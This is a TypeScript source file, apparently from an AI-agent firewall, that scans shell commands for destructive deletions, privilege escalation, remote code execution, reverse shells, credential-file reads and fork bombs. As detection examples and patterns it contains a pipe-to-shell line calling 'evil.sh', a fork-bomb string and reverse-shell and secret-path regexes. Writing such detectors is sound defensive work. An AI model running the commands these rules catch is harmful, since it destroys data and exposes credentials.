/**
 * Command-risk scanner: the heart of the firewall for the "shell" tool.
 *
 * It tokenizes the command line the way a shell would (without ever running
 * it), splits it into pipeline/chain segments, and applies a rule table that
 * covers destructive filesystem operations, privilege escalation, remote code
 * execution, reverse shells, credential dumping and obfuscation.
 *
 * The signature rule implements the product pitch:
 *   "Agent is not allowed to delete more than N files automatically."
 * `rm -rf <glob>` expands its targets against the real (read-only) filesystem
 * and escalates to CRITICAL when the deletion count exceeds
 * file_policy.max_bulk_delete.
 */

import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import type { Action, Finding, PolicyDoc, Scanner } from "../core/types.js";
import { countDeletableFiles, isRootishTarget } from "../util/paths.js";
import { parseCommand, positionalArgs, redirectTargets, splitSegments } from "../util/shell.js";
import { redactText, truncate } from "../util/secretPatterns.js";

const SHELL_INTERPRETERS = new Set(["sh", "bash", "dash", "ash", "zsh", "ksh", "pwsh", "powershell"]);
const PRIVILEGE_COMMANDS = new Set(["sudo", "su", "doas"]);
const POWER_COMMANDS = new Set(["shutdown", "reboot", "halt", "poweroff"]);
const READ_COMMANDS = new Set(["cat", "less", "head", "tail", "more", "zip", "tar", "grep", "source", "cp", "scp", "rsync"]);
const SECRET_FILE_RE =
  /(?:^|[\s"'=(])([^\s"'=]*(?:\.env\b[^\s"'=]*|id_rsa[^\s"'=]*|\.aws[/\\]credentials|\.ssh[/\\][^\s"'=]*|\.netrc|\.npmrc|\.dockercfg|credentials\.json|secrets\.[a-z]+|\.pem\b[^\s"'=]*))/i;
const FORK_BOMB_RE = /:\s*\(\s*\)\s*\{[^}]*:\s*\|\s*:[^}]*&?\s*;?\s*\}\s*;\s*:/;

interface RuleHit {
  ruleId: string;
  severity: "MEDIUM" | "HIGH" | "CRITICAL";
  title: string;
  reason: string;
  policyRef?: string;
}

function makeFinding(hit: RuleHit, raw: string): Finding {
  return {
    scanner: "commandRisk",
    ruleId: hit.ruleId,
    severity: hit.severity,
    title: hit.title,
    reason: hit.reason,
    policyRef: hit.policyRef,
    evidence: truncate(redactText(raw)),
  };
}

/** Split "-rf" style clusters into individual short flags. */
function expandFlags(args: string[]): Set<string> {
  const flags = new Set<string>();
  for (const a of args) {
    if (a.startsWith("--")) {
      flags.add(a);
    } else if (a.startsWith("-") && a.length > 1) {
      for (const ch of a.slice(1)) flags.add(`-${ch}`);
    }
  }
  return flags;
}

function scanRm(
  args: string[],
  raw: string,
  maxBulkDelete: number,
  cwd: string
): Finding[] {
  const findings: Finding[] = [];
  const flags = expandFlags(args);
  const recursive = flags.has("-r") || flags.has("-R") || flags.has("--recursive");
  const force = flags.has("-f") || flags.has("--force");
  const targets = positionalArgs(args);
  if (targets.length === 0) return findings;

  // Rule 1: target is the root, home or "everything here".
  const rootish = targets.filter(isRootishTarget);
  if (rootish.length > 0) {
    findings.push(
      makeFinding(
        {
          ruleId: "CMD-RM-ROOT",
          severity: "CRITICAL",
          title: "Destructive filesystem operation",
          reason: `rm targets "${rootish[0]}" which resolves to the filesystem root or home directory. This would erase the volume or the user's entire home.`,
        },
        raw
      )
    );
    // No need to count the real filesystem when the target is already "everything".
    return findings;
  }

  // Rule 2: bulk deletion beyond the policy limit (the pitch's headline rule).
  const { files, capped } = countDeletableFiles(targets, cwd);
  if (files > maxBulkDelete) {
    findings.push(
      makeFinding(
        {
          ruleId: "CMD-RM-BULK-DELETE",
          severity: "CRITICAL",
          title: "Destructive filesystem operation",
          reason: `rm would delete ${files}${capped ? "+" : ""} files; policy allows at most ${maxBulkDelete} automatic deletions (file_policy.max_bulk_delete).`,
          policyRef: "file_policy.max_bulk_delete",
        },
        raw
      )
    );
  }

  // Rule 3: recursive + forced deletion is dangerous even in small doses.
  if (findings.length === 0 && recursive && force) {
    findings.push(
      makeFinding(
        {
          ruleId: "CMD-RM-RECURSIVE-FORCE",
          severity: "HIGH",
          title: "Destructive filesystem operation",
          reason: `rm -rf on "${targets[0]}" combines recursion (directories) with force (no confirmation). Allowed only for small, explicitly whitelisted targets.`,
        },
        raw
      )
    );
  } else if (findings.length === 0 && recursive) {
    findings.push(
      makeFinding(
        {
          ruleId: "CMD-RM-RECURSIVE",
          severity: "MEDIUM",
          title: "Recursive file deletion",
          reason: `rm -r on "${targets[0]}" deletes directory trees; verify the target is intentional.`,
        },
        raw
      )
    );
  } else if (findings.length === 0) {
    findings.push(
      makeFinding(
        {
          ruleId: "CMD-RM",
          severity: "MEDIUM",
          title: "File deletion",
          reason: `rm deletes "${targets.join('", "')}". Confirm this is part of the intended task.`,
        },
        raw
      )
    );
  }
  return findings;
}

function scanSegment(
  segment: string,
  operatorBefore: string,
  policy: PolicyDoc,
  cwd: string
): Finding[] {
  const findings: Finding[] = [];
  const cmd = parseCommand(segment);
  if (!cmd) return findings;
  const push = (hit: RuleHit) => findings.push(makeFinding(hit, segment));

  // Pipe-to-shell: `curl https://evil.sh | sh`
  if (operatorBefore === "|" && SHELL_INTERPRETERS.has(cmd.name)) {
    push({
      ruleId: "CMD-PIPE-TO-SHELL",
      severity: "CRITICAL",
      title: "Remote/indirect code execution",
      reason: `Output of a previous command is piped directly into "${cmd.name}". A compromised upstream source gains full shell execution.`,
    });
  }

  // Process substitution exec: `bash <(curl -s https://…)`
  if (/[(<>]\s*\((?:curl|wget)\b/.test(segment) || /\b(?:bash|sh|zsh)\s+<\(/.test(segment)) {
    push({
      ruleId: "CMD-PROCESS-SUB-EXEC",
      severity: "CRITICAL",
      title: "Remote/indirect code execution",
      reason: "Process substitution feeds remote content straight into a shell interpreter.",
    });
  }

  const flags = expandFlags(cmd.args);

  if (PRIVILEGE_COMMANDS.has(cmd.name)) {
    push({
      ruleId: "CMD-PRIVILEGE-ESCALATION",
      severity: "HIGH",
      title: "Privilege escalation",
      reason: `"${cmd.name}" runs a command as another user (typically root). Agents should not escalate privileges unattended.`,
    });
  }

  if (cmd.name === "dd" && cmd.args.some((a) => a.startsWith("of=/dev/"))) {
    push({
      ruleId: "CMD-RAW-DEVICE-WRITE",
      severity: "CRITICAL",
      title: "Raw device write",
      reason: "dd writing to a device node can destroy disks or firmware.",
    });
  }

  if (cmd.name.startsWith("mkfs") || cmd.name.startsWith("mkswap")) {
    push({
      ruleId: "CMD-FORMAT-FILESYSTEM",
      severity: "CRITICAL",
      title: "Filesystem format",
      reason: `"${cmd.name}" formats a filesystem — unrecoverable data loss.`,
    });
  }

  if (POWER_COMMANDS.has(cmd.name)) {
    push({
      ruleId: "CMD-POWER-STATE",
      severity: "HIGH",
      title: "System power/state change",
      reason: `"${cmd.name}" changes the machine's power state; agents must not control host lifecycle.`,
    });
  }

  // Reverse shells
  const isNetcat = (cmd.name === "nc" || cmd.name === "ncat" || cmd.name === "netcat") && (flags.has("-e") || cmd.args.some((a) => a.startsWith("-e")));
  const isBashTcp = /\bbash\s+-i\b[^|;&]*\/dev\/tcp\//.test(segment);
  const isSocatExec = cmd.name === "socat" && cmd.args.some((a) => a.includes("EXEC:"));
  if (isNetcat || isBashTcp || isSocatExec) {
    push({
      ruleId: "CMD-REVERSE-SHELL",
      severity: "CRITICAL",
      title: "Reverse shell attempt",
      reason: "Pattern consistent with spawning an interactive shell bound to a remote host.",
    });
  }

  if (cmd.name === "env" || cmd.name === "printenv") {
    push({
      ruleId: "CMD-ENV-DUMP",
      severity: "HIGH",
      title: "Environment variable dump",
      reason: `"${cmd.name}" prints the whole environment, which typically contains API keys and tokens.`,
    });
  }

  if (cmd.name === "eval" || (cmd.name === "base64" && flags.has("-d")) || (cmd.name === "xxd" && flags.has("-r"))) {
    push({
      ruleId: "CMD-OBFUSCATION",
      severity: "HIGH",
      title: "Obfuscated command execution",
      reason: `"${cmd.name}" executes content that the policy engine cannot fully inspect (encoded or dynamically built input).`,
    });
  } else if (/\$\([^)]*\)|`[^`]+`/.test(segment)) {
    push({
      ruleId: "CMD-COMMAND-SUBSTITUTION",
      severity: "MEDIUM",
      title: "Indirect command execution",
      reason: "Command substitution runs a nested command whose output becomes part of this one.",
    });
  }

  if (cmd.name === "chmod" && cmd.args.some((a) => a === "777" || a === "a+rwx")) {
    push({
      ruleId: "CMD-WORLD-WRITABLE",
      severity: "HIGH",
      title: "World-writable permissions",
      reason: "chmod 777/a+rwx makes the target writable by every user on the system.",
    });
  } else if (cmd.name === "chmod" || cmd.name === "chown") {
    push({
      ruleId: "CMD-PERMISSION-CHANGE",
      severity: "MEDIUM",
      title: "Permission modification",
      reason: `"${cmd.name}" changes ownership or permissions; confirm this is intended.`,
    });
  }

  if (cmd.name === "git" && cmd.args.includes("push") && (flags.has("-f") || cmd.args.includes("--force") || cmd.args.includes("--force-with-lease"))) {
    push({
      ruleId: "CMD-GIT-FORCE-PUSH",
      severity: "MEDIUM",
      title: "Force push",
      reason: "git push --force can overwrite remote history and teammates' work.",
    });
  }

  if (["scp", "rsync", "sftp", "ftp"].includes(cmd.name)) {
    push({
      ruleId: "CMD-REMOTE-COPY",
      severity: "MEDIUM",
      title: "Data transfer to remote host",
      reason: `"${cmd.name}" copies files off this machine — check the destination is an approved host.`,
    });
  }

  // Reads of well-known secret material: `cat .env`, `cp ~/.aws/credentials …`
  if (READ_COMMANDS.has(cmd.name)) {
    const m = SECRET_FILE_RE.exec(segment);
    if (m) {
      push({
        ruleId: "CMD-SECRET-FILE-READ",
        severity: "HIGH",
        title: "Read of secret material",
        reason: `"${cmd.name}" targets "${m[1]}" — a file that typically holds live credentials.`,
        policyRef: "file_policy.protected_paths",
      });
    }
  }

  // Redirect targets are writes: `curl … > ~/.bashrc`
  for (const target of redirectTargets(segment)) {
    if (isRootishTarget(target)) {
      push({
        ruleId: "CMD-REDIRECT-ROOT",
        severity: "HIGH",
        title: "Overwrite of root-level path",
        reason: `Redirect target "${target}" resolves to the filesystem root or home directory.`,
      });
    }
  }

  // Custom user-supplied regexes.
  policy.command_risk.blocked_patterns.forEach((pattern, i) => {
    try {
      if (new RegExp(pattern).test(segment)) {
        push({
          ruleId: `CMD-CUSTOM-${i + 1}`,
          severity: "HIGH",
          title: "Matched custom blocked pattern",
          reason: `Command matched blocked_patterns[${i}]: /${pattern}/.`,
          policyRef: "command_risk.blocked_patterns",
        });
      }
    } catch {
      // Invalid user regex — reported by policy validation in the CLI.
    }
  });

  // rm gets the dedicated treatment above.
  if (cmd.name === "rm") {
    findings.push(...scanRm(cmd.args, segment, policy.file_policy.max_bulk_delete, cwd));
  }

  return findings;
}

function commandOf(action: Action): string | undefined {
  const c = action.params.command;
  return typeof c === "string" ? c : undefined;
}

export const commandRiskScanner: Scanner = {
  name: "commandRisk",

  scan(action: Action, policy: PolicyDoc): Finding[] {
    const command = commandOf(action);
    if (!command) return [];

    const cwd = typeof action.params.cwd === "string" ? action.params.cwd : process.cwd();
    const { segments, operators } = splitSegments(command);
    const findings: Finding[] = [];
    segments.forEach((segment, i) => {
      findings.push(...scanSegment(segment, i === 0 ? "" : operators[i - 1] ?? "", policy, cwd));
    });

    // Fork bombs span operators, so they can only be matched on the full
    // command line (":(){ :|:& };:").
    if (FORK_BOMB_RE.test(command)) {
      findings.push(
        makeFinding(
          {
            ruleId: "CMD-FORK-BOMB",
            severity: "CRITICAL",
            title: "Denial of service (fork bomb)",
            reason: "Classic shell fork-bomb pattern detected — unbounded process creation.",
          },
          command
        )
      );
    }

    // Heuristic guard the tokenizer cannot express: absurdly long single
    // command lines are a common way to slip payload past human review.
    if (command.length > 2000) {
      findings.push(
        makeFinding(
          {
            ruleId: "CMD-SUSPICIOUS-LENGTH",
            severity: "MEDIUM",
            title: "Unusually long command",
            reason: `Command is ${command.length} characters long; long payloads are hard to review.`,
          },
          command
        )
      );
    }
    return findings;
  },
};

/** Exported for tests and the audit log's redaction reuse. */
export function homeDir(): string {
  return os.homedir();
}

/** Exported for tests: does a path exist (read-only check). */
export function pathExists(p: string): boolean {
  try {
    fs.statSync(path.resolve(p));
    return true;
  } catch {
    return false;
  }
}
